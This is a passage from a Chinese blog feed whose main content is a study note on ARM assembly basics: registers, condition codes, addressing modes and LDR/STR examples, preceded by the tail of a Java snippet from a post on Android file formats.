      <span style="color:#e6db74">&#34;%&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;%p&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span>
  <span style="color:#f92672">};</span>
  	
  <span style="color:#a6e22e">@Override</span>
  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">(){</span>
      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;size:&#34;</span><span style="color:#f92672">+</span>size<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,res0:&#34;</span><span style="color:#f92672">+</span>res0<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,dataType:&#34;</span><span style="color:#f92672">+</span>getTypeStr<span style="color:#f92672">()+</span><span style="color:#e6db74">&#34;,data:&#34;</span><span style="color:#f92672">+</span>getDataStr<span style="color:#f92672">();</span>
  <span style="color:#f92672">}</span>
   
<span style="color:#f92672">}</span>
</code></pre></div><p>以上代码来自于书的原作者的博客：https://blog.csdn.net/jiangwei0910410003/article/details/50628894</p>
<p>博客里还有如何解析操作，留看。</p>
</li>
</ul>
<h3 id="总结">总结</h3>
<p>这两章讲的还是挺详细的，可以留着备用查阅，这两个文件都能加以混淆来保护应用，所以还是挺重要的。</p>
]]></content>
        </item>
        
        <item>
            <title>ARM汇编基础</title>
            <link>https://kuekiko.top/posts/2018/08/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</link>
            <pubDate>Fri, 10 Aug 2018 19:34:10 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/08/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</guid>
            <description>ARM汇编基础(简) 经常忘记，做个笔记，好作复习。。
内容主要来源于《Android软件安全与逆向分析》和《逆向工程权威指南》以及 ARM 汇编 和Azeria-labs
ARM架构 ARM属于RISC CPU，
 ARM模式 4个字节opcode 32位 Thumb模式 2个字节opcode 16位 Thumb-2模式 同上（只是有部分4个字节的opcode) 64位ARM 4个字节opcode ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。  数据类型 数据类型在汇编语言中的扩展后缀为**-h**或者**-sh**对应着半字，**-b**或者**-sb**对应着字节，但是对于字并没有对应的扩展
ldr = 加载字，宽度四字节ldrh = 加载无符号的半字，宽度两字节ldrsh = 加载有符号的半字，宽度两字节ldrb = 加载无符号的字节ldrsb = 加载有符号的字节str = 存储字，宽度四字节strh = 存储无符号的半字，宽度两字节strsh = 存储有符号的半字，宽度两字节strb = 存储无符号的字节strsb = 存储有符号的字节字节序 在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。
数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。
寄存器 37个32位寄存器，其中31个为基础寄存器，6个为状态寄存器。
用户模式下有
 不分组寄存器（R0-R7） R7一般存放系统调用号 分组寄存器（R8-R14） 程序计数器（R15） 单前程序状态寄存器（CPSR）  两种状态：
   ARM状态（32位对齐） Thumb状态(16位对齐)     R0-R7 R0-R7(相同)   CPSR CPSR（同）   R11 FP（栈帧指针）   R12 IP（内部程序调用）   R13 SP（栈指针）   R14 LR（链接寄存器）一般存放函数返回地址   R15 PC（程序计数器）    和x86对比：CSPR:32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。</description>
            <content type="html"><![CDATA[<h2 id="arm汇编基础简">ARM汇编基础(简)</h2>
<p>经常忘记，做个笔记，好作复习。。</p>
<p>内容主要来源于《Android软件安全与逆向分析》和《逆向工程权威指南》以及 <a href="https://www.anquanke.com/post/id/86383">ARM 汇编</a> 和<a href="https://azeria-labs.com/writing-arm-assembly-part-1/">Azeria-labs</a></p>
<h3 id="arm架构">ARM架构</h3>
<p>ARM属于RISC CPU，</p>
<ul>
<li>ARM模式   4个字节opcode  32位</li>
<li>Thumb模式  2个字节opcode  16位</li>
<li>Thumb-2模式  同上（只是有部分4个字节的opcode)</li>
<li>64位ARM  4个字节opcode</li>
<li>ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。</li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810112415.png" alt=""></p>
<h3 id="数据类型">数据类型</h3>
<p>数据类型在汇编语言中的扩展后缀为**-h**或者**-sh**对应着半字，**-b**或者**-sb**对应着字节，但是对于字并没有对应的扩展</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810113108.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">ldr</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">加载字，宽度四字节</span>
<span style="color:#a6e22e">ldrh</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">加载无符号的半字，宽度两字节</span>
<span style="color:#a6e22e">ldrsh</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">加载有符号的半字，宽度两字节</span>
<span style="color:#a6e22e">ldrb</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">加载无符号的字节</span>
<span style="color:#a6e22e">ldrsb</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">加载有符号的字节</span>
<span style="color:#a6e22e">str</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">存储字，宽度四字节</span>
<span style="color:#a6e22e">strh</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">存储无符号的半字，宽度两字节</span>
<span style="color:#a6e22e">strsh</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">存储有符号的半字，宽度两字节</span>
<span style="color:#a6e22e">strb</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">存储无符号的字节</span>
<span style="color:#a6e22e">strsb</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">存储有符号的字节</span>
</code></pre></div><h3 id="字节序">字节序</h3>
<p>在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。</p>
<p><img src="https://p0.ssl.qhimg.com/t01b6d7f41b02b0a58d.png" alt=""></p>
<p>数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810120701.png" alt=""></p>
<h3 id="寄存器">寄存器</h3>
<p>37个32位寄存器，其中31个为基础寄存器，6个为状态寄存器。</p>
<p>用户模式下有</p>
<ul>
<li>不分组寄存器（R0-R7） R7一般存放系统调用号</li>
<li>分组寄存器（R8-R14）</li>
<li>程序计数器（R15）</li>
<li>单前程序状态寄存器（CPSR）</li>
</ul>
<p>两种状态：</p>
<table>
<thead>
<tr>
<th align="center">ARM状态（32位对齐）</th>
<th align="center">Thumb状态(16位对齐)</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">R0-R7</td>
<td align="center">R0-R7(相同)</td>
</tr>
<tr>
<td align="center">CPSR</td>
<td align="center">CPSR（同）</td>
</tr>
<tr>
<td align="center">R11</td>
<td align="center">FP（栈帧指针）</td>
</tr>
<tr>
<td align="center">R12</td>
<td align="center">IP（内部程序调用）</td>
</tr>
<tr>
<td align="center">R13</td>
<td align="center">SP（栈指针）</td>
</tr>
<tr>
<td align="center">R14</td>
<td align="center">LR（链接寄存器）一般存放函数返回地址</td>
</tr>
<tr>
<td align="center">R15</td>
<td align="center">PC（程序计数器）</td>
</tr>
</tbody>
</table>
<p>和x86对比：<img src="https://p5.ssl.qhimg.com/t01a8e5d24fa91f9f0f.jpg" alt=""></p>
<p>CSPR:<img src="http://my-md-1253484710.coscd.myqcloud.com/20180810122226.png" alt=""></p>
<p>32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810122258.png" alt=""></p>
<table>
<thead>
<tr>
<th>条件码</th>
<th>助记符后缀</th>
<th>标志</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0000</td>
<td>EQ</td>
<td>Z置位</td>
<td>相等</td>
</tr>
<tr>
<td>0001</td>
<td>NE</td>
<td>Z清零</td>
<td>不相等</td>
</tr>
<tr>
<td>0010</td>
<td>CS</td>
<td>C置位</td>
<td>无符号数大于或等于</td>
</tr>
<tr>
<td>0011</td>
<td>CC</td>
<td>C清零</td>
<td>无符号数小于</td>
</tr>
<tr>
<td>0100</td>
<td>MI</td>
<td>N置位</td>
<td>负数</td>
</tr>
<tr>
<td>0101</td>
<td>PL</td>
<td>N清零</td>
<td>正数或零</td>
</tr>
<tr>
<td>0110</td>
<td>VS</td>
<td>V置位</td>
<td>溢出</td>
</tr>
<tr>
<td>0111</td>
<td>VC</td>
<td>V清零</td>
<td>未溢出</td>
</tr>
<tr>
<td>1000</td>
<td>HI</td>
<td>C置位Z清零</td>
<td>无符号数大于</td>
</tr>
<tr>
<td>1001</td>
<td>LS</td>
<td>C清零Z置位</td>
<td>无符号数小于或等于</td>
</tr>
<tr>
<td>1010</td>
<td>GE</td>
<td>N等于V</td>
<td>带符号数大于或等于</td>
</tr>
<tr>
<td>1011</td>
<td>LT</td>
<td>N不等于V</td>
<td>带符号数小于</td>
</tr>
<tr>
<td>1100</td>
<td>GT</td>
<td>Z清零且（N等于V）</td>
<td>带符号数大于</td>
</tr>
<tr>
<td>1101</td>
<td>LE</td>
<td>Z置位或（N不等于V）</td>
<td>带符号数小于或等于</td>
</tr>
<tr>
<td>1110</td>
<td>AL</td>
<td>忽略</td>
<td>无条件执行</td>
</tr>
</tbody>
</table>
<h3 id="程序结构">程序结构</h3>
<p>Android平台采用的是GUN ARM汇编格式，汇编器为GAS</p>
<p>参数传递：R0-R3这4个寄存器用来传递函数调用的第1到4个参数，超出的参数通过堆栈来传递。R0还用来存放函数调用的返回值。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810112712.gif" alt=""></p>
<h5 id="汇编器指令">汇编器指令</h5>
<ul>
<li><code>.file</code>:源文件名</li>
<li><code>.align</code>:代码对齐方式</li>
<li><code>.ascii</code>:声明字符串</li>
<li><code>.global</code>:声明全局符号</li>
<li><code>.type</code>：指定符号的类型</li>
<li><code>.word</code>：存放地址值</li>
<li><code> .size</code>：设置指定符号的大小</li>
<li><code>.ident</code>：编译器标识</li>
</ul>
<h3 id="寻址方式">寻址方式</h3>
<ul>
<li>
<p>立即寻址</p>
<p><code>MOV R0, #1234</code>     -&gt;R0=1234</p>
</li>
<li>
<p>寄存器寻址</p>
<p><code>MOV R1 = R2</code>   -&gt;R0=R1</p>
</li>
<li>
<p>寄存器移位寻址</p>
<ul>
<li>LSL ：逻辑左移，移位后寄存器空出的低位补0</li>
<li>LSR：逻辑右移，移位后寄存器空出的高位补0</li>
<li>ASR：算术右移，移位过程中符号位保持不变，若源操作数为正数，则移位后空出的高位补0，否则补1。</li>
<li>ROR：循环右移，移位后移出的低位填入移位空出的高位。</li>
<li>RRX：带扩展的循环右移，操作数右移一位，移出的空位用C标志的值填充。</li>
</ul>
<p><code>MOV R0, R1, LSL #2 </code>  -&gt;R1左移两位（R1&laquo;2）赋值给R0,相当于R0 = R1*4</p>
</li>
<li>
<p>寄存器间接寻址</p>
<p><code>LDR RO, [R1]</code>  -&gt;将R1寄存器的数值作为地址，取出此地址中的值赋给R0寄存器</p>
</li>
<li>
<p>基址寻址</p>
<p>多用于查表、数组访问操作。</p>
<p><code>LDR R0, [R1,#-4]</code> -&gt;将R1寄存器的数值减4作为地址，取出此地址的值赋给R0寄存器。</p>
</li>
<li>
<p>多寄存器寻址</p>
<p>一条指令最多完成16个通用寄存器值的传送。</p>
<p><code>LDMIA R0,{R1,R2,R3,R4}</code> -&gt;LDM为数据加载指令，指令的后缀IA表示每次执行完加载操作后R0寄存器的值自增1个字，ARM指令集中，子表示的是一个32位数值。这条指令作用为：R1 = [R0],R2 = [R0+#4],R3 = [R0+#8],R4 = [R0+#12]。</p>
</li>
<li>
<p>堆栈寻址</p>
<p>特定的指令来完成：<code>LDMFA/STMFA</code>、<code>LDMEA/STMEA</code>、<code>LDMFD/STMFD</code>、<code>LDMED/STMED</code>。</p>
<p>LDM和STM为指令前缀，表示多寄存器寻址，即一次传送多个寄存器的值。后面的后缀为指令后缀。</p>
<p><code>STMFD SP!, {R1-R7,LR}</code>  -&gt;将R1~R7,LR入栈，多用于保存子程序的现场。</p>
<p><code>LDMFD SP!, {R1-R7,LR}</code> -&gt;出栈，恢复现场。</p>
</li>
<li>
<p>块拷贝寻址</p>
<p>实现从连续地址数据从存储器的某一位置拷贝到另外一个位置，指令有：<code>LDMIA/STMIA</code>、<code>LDMDA/STMDA</code>、<code>LDMIB/STMIB</code>、<code>LDMDB/STMDB</code>。</p>
<p><code>LDMIA R0! {R0-R3}</code>  从R0寄存器指向的存储单元中读取3个字到R1-R3寄存器</p>
<p><code>STMIA R0! {R0-R3}</code> 存储从R1-R3寄存器的内容到R0寄存器指向的存储单元</p>
</li>
<li>
<p>相对寻址</p>
<p>以程序计数器PC的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到操作数的有效地址。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">BL</span> <span style="color:#66d9ef">NEXT</span>
  <span style="color:#960050;background-color:#1e0010">····</span>
NEXT:
  <span style="color:#960050;background-color:#1e0010">········</span>
</code></pre></div></li>
</ul>
<h3 id="arm和thumb指令集">ARM和Thumb指令集</h3>
<h5 id="基本指令简述">基本指令简述</h5>
<p><code>MNEMONIC{S}{condition} {Rd}, Operand1, Operand2 </code></p>
<p><code>助记符{是否使用CPSR}{是否条件执行以及条件} {目的寄存器}, 操作符1, 操作符2 </code></p>
<blockquote>
<p>MNEMONIC     - 指令的助记符如ADD</p>
<p>{S}                      - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关	   的FLAG</p>
<p>{condition}        - 如果机器码要被条件执行，那它需要满足的条件标示</p>
<p>{Rd}                    - 存储结果的目的寄存器</p>
<p>Operand1     - 第一个操作数，寄存器或者是一个立即数</p>
<p>Operand2     - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器</p>
</blockquote>
<p>第二操作数还有如下操作：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#75715e">#123                    - 立即数
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Rx</span>                      - <span style="color:#960050;background-color:#1e0010">寄存器比如</span><span style="color:#66d9ef">R1</span>
<span style="color:#a6e22e">Rx</span>, <span style="color:#66d9ef">ASR</span> <span style="color:#66d9ef">n</span>               - <span style="color:#960050;background-color:#1e0010">对寄存器中的值进行算术右移</span><span style="color:#66d9ef">n位后的值</span>
<span style="color:#a6e22e">Rx</span>, <span style="color:#66d9ef">LSL</span> <span style="color:#66d9ef">n</span>               - <span style="color:#960050;background-color:#1e0010">对寄存器中的值进行逻辑左移</span><span style="color:#66d9ef">n位后的值</span>
<span style="color:#a6e22e">Rx</span>, <span style="color:#66d9ef">LSR</span> <span style="color:#66d9ef">n</span>               - <span style="color:#960050;background-color:#1e0010">对寄存器中的值进行逻辑右移</span><span style="color:#66d9ef">n位后的值</span>
<span style="color:#a6e22e">Rx</span>, <span style="color:#66d9ef">ROR</span> <span style="color:#66d9ef">n</span>               - <span style="color:#960050;background-color:#1e0010">对寄存器中的值进行循环右移</span><span style="color:#66d9ef">n位后的值</span>
<span style="color:#a6e22e">Rx</span>, <span style="color:#66d9ef">RRX</span>                 - <span style="color:#960050;background-color:#1e0010">对寄存器中的值进行带扩展的循环右移</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">位后的值</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">ADD</span>   <span style="color:#66d9ef">R0</span>, <span style="color:#66d9ef">R1</span>, <span style="color:#66d9ef">R2</span>         - <span style="color:#960050;background-color:#1e0010">将第一操作数</span><span style="color:#66d9ef">R1的内容与第二操作数R2的内容相加</span><span style="color:#960050;background-color:#1e0010">，将结果存储到</span><span style="color:#66d9ef">R0中</span><span style="color:#960050;background-color:#1e0010">。</span>
<span style="color:#a6e22e">ADD</span>   <span style="color:#66d9ef">R0</span>, <span style="color:#66d9ef">R1</span>, <span style="color:#75715e">#2         - 将第一操作数R1的内容与第二操作数一个立即数相加，将结果存到R0中
</span><span style="color:#75715e"></span><span style="color:#66d9ef">MOVLE</span> <span style="color:#66d9ef">R0</span>, <span style="color:#75715e">#5             - 当满足条件LE(Less and Equal,小于等于0)将第二操作数立即数5移动到R0中,注意这条指令与MOVLE R0, R0, #5相同
</span><span style="color:#75715e"></span><span style="color:#66d9ef">MOV</span>   <span style="color:#66d9ef">R0</span>, <span style="color:#66d9ef">R1</span>, <span style="color:#66d9ef">LSL</span> <span style="color:#75715e">#1     - 将第二操作数R1寄存器中的值逻辑左移1位后存入R0
</span></code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810144732.png" alt=""></p>
<h5 id="内存访问相关指令">内存访问相关指令</h5>
<p>通常，LDR被用来从内存中加载数据到寄存器，STR被用作将寄存器的值存放到内存中。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810145231.png" alt=""></p>
<p>例子：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">.data</span>          <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#960050;background-color:#1e0010">数据段是在内存中动态创建的，所以它的在内存中的地址不可预测</span>*<span style="color:#960050;background-color:#1e0010">/</span>
var1: <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">3</span>  <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#960050;background-color:#1e0010">内存中的第一个变量</span> *<span style="color:#960050;background-color:#1e0010">/</span>
var2: <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">4</span>  <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#960050;background-color:#1e0010">内存中的第二个变量</span> *<span style="color:#960050;background-color:#1e0010">/</span>
<span style="color:#a6e22e">.text</span>          <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#960050;background-color:#1e0010">代码段开始</span> *<span style="color:#960050;background-color:#1e0010">/</span> 
<span style="color:#66d9ef">.global</span> <span style="color:#66d9ef">_start</span>
_start:
    <span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r0</span>, <span style="color:#66d9ef">adr_var1</span>  <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将存放</span><span style="color:#66d9ef">var1值的地址adr_var1加载到寄存器R0中</span> 
    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">adr_var2</span>  <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将存放</span><span style="color:#66d9ef">var2值的地址adr_var2加载到寄存器R1中</span> 
    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r0</span>]      <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将</span><span style="color:#66d9ef">R0所指向地址中存放的0x3加载到寄存器R2中</span>  
    <span style="color:#66d9ef">str</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r1</span>]      <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将</span><span style="color:#66d9ef">R2中的值0x3存放到R1做指向的地址</span> 
    <span style="color:#66d9ef">bkpt</span>             
<span style="color:#66d9ef">adr_var1</span>: <span style="color:#66d9ef">.word</span> <span style="color:#66d9ef">var1</span>  <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#66d9ef">var1的地址助记符</span> *<span style="color:#960050;background-color:#1e0010">/</span>
adr_var2: <span style="color:#a6e22e">.word</span> <span style="color:#66d9ef">var2</span>  <span style="color:#960050;background-color:#1e0010">/</span>* <span style="color:#66d9ef">var2的地址助记符</span> *<span style="color:#960050;background-color:#1e0010">/</span>
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810145711.gif" alt=""></p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810154906.png" alt=""></p>
<ul>
<li>
<p>第一种偏移形式：立即数作偏移</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">STR</span>    <span style="color:#66d9ef">Ra</span>, [<span style="color:#66d9ef">Rb</span>, <span style="color:#66d9ef">imm</span>]
<span style="color:#a6e22e">LDR</span>    <span style="color:#66d9ef">Ra</span>, [<span style="color:#66d9ef">Rc</span>, <span style="color:#66d9ef">imm</span>]
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">  
<span style="color:#a6e22e">.data</span>
var1: <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">3</span>
var2: <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">4</span>
<span style="color:#a6e22e">.text</span>
<span style="color:#a6e22e">.global</span> <span style="color:#66d9ef">_start</span>
_start:
    <span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r0</span>, <span style="color:#66d9ef">adr_var1</span>  <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将存放</span><span style="color:#66d9ef">var1值的地址adr_var1加载到寄存器R0中</span> 
    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">adr_var2</span>  <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将存放</span><span style="color:#66d9ef">var2值的地址adr_var2加载到寄存器R1中</span> 
    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r0</span>]      <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将</span><span style="color:#66d9ef">R0所指向地址中存放的0x3加载到寄存器R2中</span>  
    <span style="color:#66d9ef">str</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r1</span>, <span style="color:#75715e">#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">str</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r1</span>, <span style="color:#75715e">#4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r3</span>, [<span style="color:#66d9ef">r1</span>], <span style="color:#75715e">#4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">bkpt</span>
adr_var1: <span style="color:#a6e22e">.word</span> <span style="color:#66d9ef">var1</span>
adr_var2: <span style="color:#a6e22e">.word</span> <span style="color:#66d9ef">var2</span>
</code></pre></div></li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810160844.gif" alt=""></p>
<ul>
<li>
<p><strong>第二种偏移形式：寄存器作偏移</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">STR</span>    <span style="color:#66d9ef">Ra</span>, [<span style="color:#66d9ef">Rb</span>, <span style="color:#66d9ef">Rc</span>]
<span style="color:#a6e22e">LDR</span>    <span style="color:#66d9ef">Ra</span>, [<span style="color:#66d9ef">Rb</span>, <span style="color:#66d9ef">Rc</span>]
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">.data</span>
var1: <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">3</span>
var2: <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">4</span>
<span style="color:#a6e22e">.text</span>
<span style="color:#a6e22e">.global</span> <span style="color:#66d9ef">_start</span>
_start:
    <span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r0</span>, <span style="color:#66d9ef">adr_var1</span>  <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将存放</span><span style="color:#66d9ef">var1值的地址adr_var1加载到寄存器R0中</span> 
    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">adr_var2</span>  <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将存放</span><span style="color:#66d9ef">var2值的地址adr_var2加载到寄存器R1中</span> 
    <span style="color:#66d9ef">ldr</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r0</span>]      <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">将</span><span style="color:#66d9ef">R0所指向地址中存放的0x3加载到寄存器R2中</span>  
    <span style="color:#66d9ef">str</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r2</span>]  <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">取址模式：基于偏移量。</span><span style="color:#66d9ef">R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处</span><span style="color:#960050;background-color:#1e0010">。</span><span style="color:#66d9ef">R1寄存器不会被修改</span><span style="color:#960050;background-color:#1e0010">。</span> 
    <span style="color:#66d9ef">str</span> <span style="color:#66d9ef">r2</span>, [<span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r2</span>]! <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">取址模式：基于索引前置修改。</span><span style="color:#66d9ef">R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处</span><span style="color:#960050;background-color:#1e0010">，之后</span><span style="color:#66d9ef">R1寄存器中的值被更新</span>,<span style="color:#960050;background-color:#1e0010">也就是</span><span style="color:#66d9ef">R1</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#66d9ef">R1</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">R2</span><span style="color:#960050;background-color:#1e0010">。</span>
    <span style="color:#a6e22e">ldr</span> <span style="color:#66d9ef">r3</span>, [<span style="color:#66d9ef">r1</span>], <span style="color:#66d9ef">r2</span>  <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">取址模式：基于索引后置修改。</span><span style="color:#66d9ef">R3寄存器中的值是从R1寄存器的值所指向的地址中加载的</span><span style="color:#960050;background-color:#1e0010">，加载之后</span><span style="color:#66d9ef">R1寄存器中的值被更新也就是R1</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#66d9ef">R1</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">R2</span><span style="color:#960050;background-color:#1e0010">。</span>
    <span style="color:#a6e22e">bx</span> <span style="color:#66d9ef">lr</span>
adr_var1: <span style="color:#a6e22e">.word</span> <span style="color:#66d9ef">var1</span>
adr_var2: <span style="color:#a6e22e">.word</span> <span style="color:#66d9ef">var2</span>
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180810162217.gif" alt=""></p>
</li>
<li>
<p><strong>第三种偏移形式：寄存器缩放值作偏移</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">LDR</span>    <span style="color:#66d9ef">Ra</span>, [<span style="color:#66d9ef">Rb</span>, <span style="color:#66d9ef">Rc</span>, <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#66d9ef">shifter</span><span style="color:#960050;background-color:#1e0010">&gt;</span>]
